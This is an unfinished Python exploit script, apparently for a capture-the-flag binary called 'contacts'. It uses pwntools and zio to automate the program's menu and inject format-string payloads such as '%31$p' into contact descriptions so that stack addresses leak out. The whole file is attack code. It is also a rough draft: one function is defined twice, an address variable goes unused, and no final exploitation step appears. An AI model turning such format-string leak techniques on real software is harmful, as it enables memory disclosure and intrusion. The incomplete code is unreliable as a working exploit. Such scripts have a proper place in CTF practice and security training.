from pwn import *
from zio import *

target = "./contacts"
context(arch = 'i386', os = 'linux')

def get_io(target):
	ELF("./contacts")
	io = zio(target, timeout = 9999, print_read = COLORED(RAW, 'green'), print_write = COLORED(RAW, 'blue'))
	return io


def create_contact(io, name, number, description):
	io.read_until(">>> ")
	io.write("1\n")
	io.read_until("Name: ")
	io.write(name + "\n")
	io.read_until("No: ")
	io.write(number + "\n")
	io.read_until("description: ")
	io.write(str(len(description)) + "\n");
	io.read_until("description:")
	io.write(description + "\n");

def edit_contact(io, name, edit_type, new_info):
	io.read_until(">>> ")
	io.write("3\n")
	io.read_until("change? ")
	io.write(name + "\n")
	if edit_type == 3:
		return
	io.read_until(">>> ")
	if edit_type == 2:
		io.read_until("Length of description: ")
		io.write(str(len(new_info)) + "\n")

	io.read_until(":")
	io.write(new_info + "\n")
	return 




def display_contact(io):
	io.read_until(">>> ")
	io.write("4\n")

	io.read_until("Description: ")
	data = io.read_until("Menu:")
	data = data[8:-5]

	allinfo = data.split(".")[:-1]
	index = 1
	for item in allinfo:
		print index, ":", item
		index += 1
	return data

def display_contact(io):
	io.read_until(">>> ")
	io.write("4\n")

	io.read_until("Description: ")
	data = io.read_until("Menu:")
	data = data[:-5]

	allinfo = data.strip(".").split(".")
	index = 1
	for item in allinfo:
		print index, ":", item
		index += 1
	return data

def gernerate_format_string(index, length):
	data = ""
	while True:
		buff = "%%%d$p."%(index)
		if len(data + buff) > length:
			return data, index
		data += buff
		index += 1

def get_stack_addr(io):
	index = 1
	data, index = gernerate_format_string(index, 500)
	

	create_contact(io, "pxx", "111", data)
	io.gdb_hint()
	stack_buff = "a"*4 + "b"*4 + "c" * 56
	edit_contact(io, stack_buff, 3, stack_buff)
	display_contact(io)
	io.write("5\n")
	print 'index:',index

def pwn(io):
	create_contact(io, "pxx", "111", "%31$p")
	io.gdb_hint()
	data = display_contact(io)
	print "data:", data

	run_addr = 0x0003E6A3
	io.write("5\n")

io = get_io(target)
pwn(io)